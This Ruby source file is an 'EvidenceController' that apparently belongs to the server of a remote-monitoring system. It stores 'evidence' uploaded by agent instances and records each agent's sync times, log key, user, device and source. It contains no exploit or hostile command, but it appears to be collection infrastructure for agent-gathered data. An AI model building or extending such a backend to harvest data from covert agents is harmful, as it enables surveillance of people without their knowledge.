#
# Controller for the Evidence objects
#

require 'rcs-db/db_layer'

# rcs-common
require 'rcs-common/evidence_manager'
require 'rcs-common/symbolize'

require 'eventmachine'
require 'em-http-request'

# system
require 'time'
require 'json'

module RCS
module DB

class EvidenceController < RESTController

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server

    # create a phony session
    session = {:instance => @params['_id']}

    # save the evidence in the db
    begin
      id = EvidenceManager.instance.store_evidence session, @request[:content].size, @request[:content]
      # notify the worker
      trace :info, "Evidence saved. Notifying worker of [#{session[:instance]}][#{id}]"
      notification = {session[:instance] => [id]}.to_json
      request = EM::HttpRequest.new('http://127.0.0.1:5150').post :body => notification
      request.callback {|http| http.response}
    rescue
      return RESTController.reply.not_found
    end
    
    return RESTController.reply.ok({:bytes => @request[:content].size})
  end
  
  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server
    
    # create a phony session
    session = @params.symbolize
    
    # retrieve the key from the db
    agent = Item.where({_id: session[:bid]}).first
    return RESTController.reply.not_found if agent.nil?
    key = agent[:logkey]
    
    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(@params['sync_time']).getutc
    
    # store the status
    EvidenceManager.instance.sync_start session, @params['version'], @params['user'], @params['device'], @params['source'], time.to_i, key

    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:source] = @params['source']
    agent.stat[:user] = @params['user']
    agent.stat[:device] = @params['device']
    agent.save
    
    return RESTController.reply.ok
  end
  
  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # store the status
    EvidenceManager.instance.sync_end session

    return RESTController.reply.ok
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # store the status
    EvidenceManager.instance.sync_timeout session

    return RESTController.reply.ok
  end

end

end #DB::
end #RCS::